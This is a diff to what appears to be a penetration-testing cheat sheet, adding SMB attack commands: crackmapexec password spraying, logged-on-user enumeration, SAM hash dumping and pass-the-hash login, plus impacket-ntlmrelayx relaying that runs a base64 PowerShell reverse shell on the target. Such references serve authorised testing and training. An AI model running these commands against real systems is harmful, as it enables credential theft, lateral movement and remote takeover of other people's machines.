@@ -255,7 +255,12 @@ $ crackmapexec smb <IP address> --shares -u '' -p ''
 $ crackmapexec smb <IP address> -u <usernames.txt> -p '<password>'
 $ crackmapexec smb <IP address> --shares -u <username> -p '<password>'
 $ crackmapexec smb <IP address> -u <username> -p '<password>' -x 'whoami' --exec-method smbexec
+$ crackmapexec smb <CIDR IP address> -u <username> -p '<password>' --loggedon-users
+$ crackmapexec smb <IP address> -u <username> -p '<password>' --sam
+$ crackmapexec smb <IP address> -u <username> -H <hash>
 $ impacket-psexec <username>:'<password>'@<IP address>
+$ impacket-ntlmrelayx --no-http-server -smb2support -t <IP address>
+$ impacket-ntlmrelayx --no-http-server -smb2support -t <IP address> -c 'powershell -e <base64 reverse shell>
 ```
 
 - IMAP (port 143)
